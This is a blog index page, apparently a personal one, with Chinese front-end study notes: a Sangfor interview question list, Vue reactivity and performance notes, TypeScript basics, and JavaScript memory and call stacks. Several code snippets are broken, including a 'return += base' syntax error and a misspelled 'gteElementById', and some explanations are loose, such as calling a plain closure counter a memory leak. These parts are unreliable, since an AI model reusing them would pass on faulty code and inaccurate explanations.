<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Learning never ends</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Learning never ends">
<meta property="og:url" content="https://wxyhahaha.github.io/index.html">
<meta property="og:site_name" content="Learning never ends">
<meta property="og:locale">
<meta property="article:author" content="wuxunyu">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Learning never ends" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 6.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Learning never ends</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Suche"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Suche"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://wxyhahaha.github.io"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-面试/深信服" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/07/01/%E9%9D%A2%E8%AF%95/%E6%B7%B1%E4%BF%A1%E6%9C%8D/" class="article-date">
  <time class="dt-published" datetime="2022-07-01T05:39:11.479Z" itemprop="datePublished">2022-07-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/07/01/%E9%9D%A2%E8%AF%95/%E6%B7%B1%E4%BF%A1%E6%9C%8D/">深信服</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="一面"><a href="#一面" class="headerlink" title="一面"></a>一面</h1><h2 id="自我介绍"><a href="#自我介绍" class="headerlink" title="自我介绍"></a>自我介绍</h2><ul>
<li>表明从哪里来，被谁推荐来，荣幸，高兴来</li>
<li>简单介绍目前工作情况，架构变动导致迅速成长，主要职责（…）</li>
<li>简单介绍主要成就（跨技术栈组件，接口代码生成工具，商品列表实现配置快速接入页面，vue 脚手架）引导面试官追问</li>
<li>综合招聘资料，符合岗位要求</li>
</ul>
<h2 id="正式开始"><a href="#正式开始" class="headerlink" title="正式开始"></a>正式开始</h2><ol>
<li>围绕项目一一展开</li>
</ol>
<ul>
<li>背景</li>
<li>作用是什么</li>
<li>如何使用</li>
<li>面向过程还是对象（说面向对象，引导出设计模式）</li>
<li>如何维护，运行报错怎么排查</li>
<li>如何发包</li>
<li>在项目中的难点是什么，怎么解决</li>
<li>可以去扩展吗（结合自己是面向对象的写法，可以说基于基类去多写一个类）</li>
</ul>
<ol start="2">
<li><p>看过什么设计模式，以及有在项目中使用吗</p>
</li>
<li><p>做过 webpack 什么优化</p>
</li>
<li><p>webapck 和 rollup 有什么区别</p>
</li>
<li><p>web 安全你知道有哪几种，怎么防御，对于 crsf，有案例用户被拿到了电话号码，这个过程怎么实现？</p>
</li>
<li><p>vue 父子组件钩子运行时的顺序</p>
</li>
<li><p>vue 的生命周期介绍</p>
</li>
<li><p>vue 子组件在更新到渲染的执行过程是怎么样的</p>
</li>
<li><p>vnode 是什么</p>
</li>
<li><p>子组件 render 触发的时候父组件会不会触发 render</p>
</li>
<li><p>父组件 render 触发会不会触发子组件 render</p>
</li>
<li><p>vue 的插件机制</p>
</li>
<li><p>angular 和 vue 你认为有什么区别，你自己喜欢哪种，理由是什么</p>
</li>
<li><p>如果有个 npm 包内有逻辑错误，结合项目生命周期短应该怎么去修复</p>
</li>
<li><p>怎么发布一个 npm</p>
</li>
<li><p>认为自己比较擅长哪方面（业务，基础架构，技术框架，插件）</p>
</li>
<li><p>ts type 和 interface 区别</p>
</li>
<li><p>ts 怎么重写一个类型里面的属性类型，用 type ，interface 两者各自实现（对于 interface 要使用 pick 高级用法）</p>
</li>
<li><p>描述一下副作用，副作用的作用</p>
</li>
<li><p>纯函数是什么</p>
</li>
<li><p>wepack 和 rollup 如何设置副作用对其 tree shaking</p>
</li>
<li><p>github 上面有项目吗（有个基于 webcomponent 的正在建设组件库）<br>介绍一下（我说出了背景，有包括了哪几种技术选型，规划，以及目前进度）</p>
</li>
<li><p>对于现在岗位有什么计划吗（引导计划微前端，简单说原理）</p>
</li>
<li><p>中间有一道算法题，将一个含有父 id 被拍平的树，重新生成一颗树</p>
</li>
</ol>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">arr = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">id</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;a&quot;</span>,</span><br><span class="line">    <span class="attr">parentId</span>: -<span class="number">1</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">id</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;b&quot;</span>,</span><br><span class="line">    <span class="attr">parentId</span>: <span class="number">1</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">id</span>: <span class="number">3</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;c&quot;</span>,</span><br><span class="line">    <span class="attr">parentId</span>: <span class="number">2</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">id</span>: <span class="number">4</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;d&quot;</span>,</span><br><span class="line">    <span class="attr">parentId</span>: <span class="number">3</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">];</span><br></pre></td></tr></table></figure>

<blockquote>
<p>总结：基本能答上，但是百分之 25 左右吱吱呜呜答不出所以然，还有一道算答题没做出来。<br>对于发散性的问题应该主要考察工作时的一些工作能力，回答的时候应该尽可能主动去列出多种情况以及补救方法（比如现在报错了怎么定位，npm 报错了，你认为 xxx 等）</p>
</blockquote>
<h1 id="二面"><a href="#二面" class="headerlink" title="二面"></a>二面</h1><p>主要针对自己做的项目介绍</p>
<p>-&gt; <a href="/%E9%9D%A2%E8%AF%95/%E9%A1%B9%E7%9B%AE%E9%9D%A2.md">项目面的心得</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://wxyhahaha.github.io/2022/07/01/%E9%9D%A2%E8%AF%95/%E6%B7%B1%E4%BF%A1%E6%9C%8D/" data-id="cl51vix5e00001svz3awrbqee" data-title="深信服" class="article-share-link">Teilen</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-vue/readme" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/07/01/vue/readme/" class="article-date">
  <time class="dt-published" datetime="2022-07-01T03:06:16.165Z" itemprop="datePublished">2022-07-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/07/01/vue/readme/">vue</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="v-if-和-v-for-的优先级"><a href="#v-if-和-v-for-的优先级" class="headerlink" title="v-if 和 v-for 的优先级"></a>v-if 和 v-for 的优先级</h1><p>源码： compiler&#x2F;codegen&#x2F;index.js</p>
<p>v-for 优先于 v-if</p>
<p>同时出现会先执行 v-for,浪费性能，先循环再判断是否显示（v-if）</p>
<p>源码中</p>
<p>Else if(v-for)</p>
<p>Else if (v-if)</p>
<p>v-for 明显优先于 v-if</p>
<h1 id="data-是一个函数"><a href="#data-是一个函数" class="headerlink" title="data 是一个函数"></a>data 是一个函数</h1><p>源码： initData()</p>
<h1 id="diff"><a href="#diff" class="headerlink" title="diff"></a>diff</h1><p>源码：mountComponent()</p>
<p>源码：patchVnode() diff 发生地方，深度优先，同层比较</p>
<p>源码：updateChildren()</p>
<p><img src="/images/image-20211104003501161.png" alt="image-20211104003501161"></p>
<h1 id="vue3-特性"><a href="#vue3-特性" class="headerlink" title="vue3 特性"></a>vue3 特性</h1><ol>
<li>更快</li>
</ol>
<ul>
<li>虚拟 DOM 重写</li>
<li>优化 slots 的生成</li>
<li>静态树的提升</li>
<li>静态属性的提升</li>
<li>基于 Proxy 的响应式系统</li>
</ul>
<ol start="2">
<li>更小：通过摇树优化核心库体积</li>
<li>更容易维护：Typescript + 源码模块化</li>
<li>更加友好</li>
</ol>
<ul>
<li>跨平台： 编译器核心和运行时核心与平台无关，使得 Vue 更容易与任何平台（Web,Android,IOS）使用</li>
</ul>
<ol start="5">
<li>更容易使用</li>
</ol>
<ul>
<li>改进 Typescript 支持，编辑器能够提供强有力的类型检查和错误及警告</li>
<li>更改好的调试支持</li>
<li>独立的响应化模块</li>
<li>Compostions API</li>
</ul>
<h1 id="Vue-性能优化方法"><a href="#Vue-性能优化方法" class="headerlink" title="Vue 性能优化方法"></a>Vue 性能优化方法</h1><ul>
<li><p>路由懒加载</p>
</li>
<li><p>keep-alive</p>
</li>
<li><p>使用 v-show 复用 DOM</p>
</li>
<li><p>v-for 遍历避免同时使用 v-if</p>
</li>
<li><p>长列表性能优化</p>
<p>使用 Object.freeze()</p>
</li>
</ul>
<p>​ defindProperty configruable &#x3D; false</p>
<p>​ 虚拟滚动（三方库，vue-virtual-scrlloer）</p>
<ul>
<li><p>事件的销毁</p>
<p>组件本身的事件再销毁的时候会自动销毁。</p>
<p>但使用定时器等。建议再 beforeDestroy 时卸载定时器，防止内存泄漏</p>
</li>
<li><p>图片的懒加载</p>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// 记录滚动条位置，到达时才显示 <span class="tag">&lt;<span class="name">img</span> <span class="attr">v-lazy</span>=<span class="string">&quot;src&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>第三方插件按需引入</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Button</span> &#125; <span class="keyword">from</span> <span class="string">&quot;element-ui&quot;</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>无状态的组件标记为函数式组件</li>
<li>子组件分割<br>切割有动态内容的组件，不会影响其他内容的渲染，有独立的 watcher</li>
<li>变量本地化<br>在计算属性使用计算属性时，使用赋值变量，减少 computed 中 get 的逻辑运行（缓存处理等）</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">	<span class="title function_">computed</span>(<span class="params"></span>) &#123;</span><br><span class="line">		<span class="title function_">base</span>(<span class="params"></span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">12</span>;</span><br><span class="line">		&#125;,</span><br><span class="line">        <span class="title function_">count</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> base = <span class="variable language_">this</span>.<span class="property">base</span>; <span class="comment">// 不要频繁引用this.base</span></span><br><span class="line">            <span class="keyword">let</span> res = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">return</span> += base;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Virtual-Dom-有哪些优势，为何要设计它"><a href="#Virtual-Dom-有哪些优势，为何要设计它" class="headerlink" title="Virtual Dom 有哪些优势，为何要设计它"></a>Virtual Dom 有哪些优势，为何要设计它</h1><p>DOM 引擎、JS 引擎相互独立，但又工作在一个线程，JS 代码调用 DOM API 必须挂起 JS 引擎，这意味有可能会产生阻塞。且若大量的调用 DOM API，浏览器可能引起大量重绘排版，引起更大的性能消耗</p>
<p>VDOM 和真实 DOM 的区别和优化：</p>
<ol>
<li>VDOM 不会立马进行排版和重绘操作</li>
<li>VDOM 进行频繁修改，然后一次性比较并修改真实 DOM 需要修改的部分，减少 DOM 节点排版和重绘消耗</li>
</ol>
<h1 id="关于-render-不为人知的秘密"><a href="#关于-render-不为人知的秘密" class="headerlink" title="关于 render 不为人知的秘密"></a>关于 render 不为人知的秘密</h1><h1 id="原生操作DOM和通过框架封装操作"><a href="#原生操作DOM和通过框架封装操作" class="headerlink" title="原生操作DOM和通过框架封装操作"></a>原生操作DOM和通过框架封装操作</h1><p>貌似用documentFragment或直接操作dom 性能更好，为什么要使用虚拟dom方式去操作呢？</p>
<ol>
<li>性能 vs 维护性</li>
<li>框架封装的具有描述性目标性</li>
<li>框架保证 不用你手动优化</li>
</ol>
<h1 id="关于render不为人知的秘密"><a href="#关于render不为人知的秘密" class="headerlink" title="关于render不为人知的秘密"></a>关于render不为人知的秘密</h1><ul>
<li><p>render的结果为一个 Vnode  </p>
</li>
<li><p>组件render互不干扰<br>那么问题来了：<br>依赖一当发生变化，那么所在组件渲染的render函数会重新执行，那如果组件里面嵌套组件，当父组件执行render的时候，要重新生成vnode吗，子组件的render不会执行那么也就不会生成vnode，子组件没有新的vnode，patch的时候怎么比对新旧节点？</p>
</li>
<li><p>render 的结果为一个 Vnode</p>
</li>
<li><p>组件 render 互不干扰<br>那么问题来了：<br>依赖一当发生变化，那么所在组件渲染的 render 函数会重新执行，那如果组件里面嵌套组件，当父组件执行 render 的时候，要重新生成 vnode 吗，子组件的 render 不会执行那么也就不会生成 vnode，子组件没有新的 vnode，patch 的时候怎么比对新旧节点？</p>
</li>
</ul>
<h1 id="关于依赖收集"><a href="#关于依赖收集" class="headerlink" title="关于依赖收集"></a>关于依赖收集</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>Dep observer Watch 之间的关系</p>
<p>先定义响应数据 -&gt; 修改 get -&gt; 在 get 中利用 dep.depend</p>
<h2 id="computed-缓存和依赖收集原理"><a href="#computed-缓存和依赖收集原理" class="headerlink" title="computed 缓存和依赖收集原理"></a>computed 缓存和依赖收集原理</h2><p>会为每个 <code>computed</code> 属性增加 <code>Watcher</code> 并且改写 <code>Object.definedProperty</code> 的 <code>set</code> 属性,<br>缓存： 当调用 <code>computed</code> 属性时，用 <code>dirty</code> 属性会判断 是否已经执行过，为 <code>true</code> 则重新计算，随后设置为 <code>false</code><br>render 中调用属性时，</p>
<ol>
<li><code>watcher.eavalute()</code></li>
<li><code>popTarget(将 computed watcher 弹出，由渲染 watcher 接管)</code></li>
<li><code> dirty = false</code></li>
<li><code> computed watcher.depend()</code></li>
<li><code>computed dep.depend</code></li>
<li><code>渲染 watcher.addDep(收集 computed 的依赖)</code></li>
<li><code> 依赖发生变化， update()</code></li>
<li><code>dirty = true</code></li>
<li><code>重新执行 render</code></li>
<li><code>执行 watcher.eavalute()</code></li>
</ol>
<ul>
<li>关键代码：</li>
</ul>
<p>initState</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// computed get</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createComputedGetter</span>(<span class="params">key</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">function</span> <span class="title function_">computedGetter</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> watcher = <span class="variable language_">this</span>.<span class="property">_computedWatchers</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">_computedWatchers</span>[key];</span><br><span class="line">    <span class="keyword">if</span> (watcher) &#123;</span><br><span class="line">      <span class="keyword">if</span> (watcher.<span class="property">dirty</span>) &#123;</span><br><span class="line">        watcher.evaluate();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title class_">Dep</span>.<span class="property">target</span>) &#123;</span><br><span class="line">        watcher.<span class="title function_">depend</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> watcher.<span class="property">value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Watcher</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">evaluate () &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">value</span> = <span class="variable language_">this</span>.<span class="title function_">get</span>()</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">dirty</span> = <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行computed属性函数</span></span><br><span class="line">get () &#123;</span><br><span class="line">  <span class="title function_">pushTarget</span>(<span class="variable language_">this</span>)</span><br><span class="line">  <span class="keyword">let</span> value</span><br><span class="line">  <span class="keyword">const</span> vm = <span class="variable language_">this</span>.<span class="property">vm</span></span><br><span class="line">  value = <span class="variable language_">this</span>.<span class="property">getter</span>.<span class="title function_">call</span>(vm, vm)</span><br><span class="line">  <span class="title function_">popTarget</span>()</span><br><span class="line">  <span class="keyword">return</span> value</span><br><span class="line">&#125;</span><br><span class="line">depend () &#123;</span><br><span class="line">  <span class="keyword">let</span> i = <span class="variable language_">this</span>.<span class="property">deps</span>.<span class="property">length</span></span><br><span class="line">  <span class="keyword">while</span> (i--) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">deps</span>[i].<span class="title function_">depend</span>()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">update () &#123;</span><br><span class="line">  <span class="comment">/* istanbul ignore else */</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">lazy</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">dirty</span> = <span class="literal">true</span></span><br><span class="line">  &#125; ....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">depend () &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title class_">Dep</span>.<span class="property">target</span>) &#123;</span><br><span class="line">    <span class="title class_">Dep</span>.<span class="property">target</span>.<span class="title function_">addDep</span>(<span class="variable language_">this</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="生命周期的顺序理解"><a href="#生命周期的顺序理解" class="headerlink" title="生命周期的顺序理解"></a>生命周期的顺序理解</h1><h1 id="基于vue-js-3-响应式原理"><a href="#基于vue-js-3-响应式原理" class="headerlink" title="基于vue.js 3 响应式原理"></a>基于vue.js 3 响应式原理</h1><p>…</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://wxyhahaha.github.io/2022/07/01/vue/readme/" data-id="cl51viy9700081svzfzjeechr" data-title="vue" class="article-share-link">Teilen</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-typescript/readme" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/07/01/typescript/readme/" class="article-date">
  <time class="dt-published" datetime="2022-07-01T03:06:16.121Z" itemprop="datePublished">2022-07-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/07/01/typescript/readme/">typescript</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="type-和-interface-区别"><a href="#type-和-interface-区别" class="headerlink" title="type 和 interface 区别"></a>type 和 interface 区别</h1><p>type 简单类型</p>
<p>interface 复杂类型</p>
<p>type 不可以重复声明</p>
<p>联合类型表达方式不同 type |    interface  extends</p>
<h1 id="never-x2F-unknow-x2F-any-区别"><a href="#never-x2F-unknow-x2F-any-区别" class="headerlink" title="never&#x2F;unknow&#x2F;any 区别"></a>never&#x2F;unknow&#x2F;any 区别</h1><p>声明 let a &#x3D; [];   &#x2F;&#x2F; never[]<br>let a &#x2F;&#x2F; any<br>object as unknow as number</p>
<h1 id="Pick-x2F-Partial-x2F-Record-高级用法"><a href="#Pick-x2F-Partial-x2F-Record-高级用法" class="headerlink" title="Pick&#x2F;Partial&#x2F;Record 高级用法"></a>Pick&#x2F;Partial&#x2F;Record 高级用法</h1><h1 id="import-type"><a href="#import-type" class="headerlink" title="import type"></a>import type</h1><p>类型保护，不会编译</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://wxyhahaha.github.io/2022/07/01/typescript/readme/" data-id="cl51viy8c00071svzcso94moy" data-title="typescript" class="article-share-link">Teilen</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-style/readme" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/07/01/style/readme/" class="article-date">
  <time class="dt-published" datetime="2022-07-01T03:06:16.048Z" itemprop="datePublished">2022-07-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/07/01/style/readme/">style</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p><img src="/images/image-20211116230538141.png" alt="image-20211116230538141"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://wxyhahaha.github.io/2022/07/01/style/readme/" data-id="cl51viy7d00061svzecd7eipu" data-title="style" class="article-share-link">Teilen</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-js/readme" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/07/01/js/readme/" class="article-date">
  <time class="dt-published" datetime="2022-07-01T03:06:16.029Z" itemprop="datePublished">2022-07-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/07/01/js/readme/">js</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="内存机制"><a href="#内存机制" class="headerlink" title="内存机制"></a>内存机制</h1><p>js 内存空间分为栈(stack)、堆(heap)</p>
<p>栈：数据在栈内存中的存储与使用方式类似于数据结构中的堆栈数据结构，遵循后进先出的原则。</p>
<p><strong>堆：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a1 = <span class="number">0</span>; <span class="comment">// ``栈`</span></span><br><span class="line"><span class="keyword">var</span> a2 = <span class="string">&quot;this is string&quot;</span>; <span class="comment">// ``栈`</span></span><br><span class="line"><span class="keyword">var</span> a3 = <span class="literal">null</span>; <span class="comment">// ``栈`</span></span><br><span class="line"><span class="keyword">var</span> b = &#123; <span class="attr">m</span>: <span class="number">20</span> &#125;; <span class="comment">// ``变量``b``存在于栈中，``&#123;m: 20&#125; ``作为对象存在于堆内存中`</span></span><br><span class="line"><span class="keyword">var</span> c = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]; <span class="comment">// ``变量``c``存在于栈中，``[1, 2, 3] ``作为对象存在于堆内存中```</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/clip_image001.png" alt="clip_image001"></p>
<blockquote>
<p>基础数据类型： <code>Number</code> <code>String</code> <code>Null</code> <code>Undefined</code> <code>Boolean</code></p>
</blockquote>
<p><strong>内存泄漏：</strong></p>
<p>当内存存在无法被垃圾回收时，这种就叫内存泄漏<br>一段代码解释：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dom处理</span></span><br><span class="line"><span class="keyword">const</span> el = <span class="variable language_">document</span>.<span class="title function_">gteElementById</span>(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">el.<span class="property">onclick</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(el); <span class="comment">// 产生循环引用</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 闭包</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">counter</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> num = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    num++;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> count = <span class="title function_">counter</span>();</span><br><span class="line"><span class="title function_">count</span>(); <span class="comment">// num === 1</span></span><br><span class="line"><span class="title function_">count</span>(); <span class="comment">// num === 2</span></span><br><span class="line"><span class="comment">// num并不会被回收</span></span><br></pre></td></tr></table></figure>

<p><strong>如何解决：</strong></p>
<ol>
<li>手动清除引用</li>
</ol>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> el = <span class="variable language_">document</span>.<span class="title function_">gteElementById</span>(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">el.<span class="property">onclick</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(el);</span><br><span class="line">  el = <span class="literal">null</span>; <span class="comment">// 执行完释放</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>使用弱引用-不计入 gc</li>
</ol>
<ul>
<li>weakMap</li>
<li>weakSet</li>
</ul>
<h2 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h2><p><strong>什么是调用栈？</strong><br><code>调用栈</code>指的是管理函数调用的一种数据结构，<code>栈</code>一种容器，遵循<code>先进后出</code>，<code>后进先出</code>。<br><strong>什么是栈溢出？</strong><br>一段代码解释：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">division</span>(<span class="params">x, y</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">division</span>(x, y);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">division</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br></pre></td></tr></table></figure>

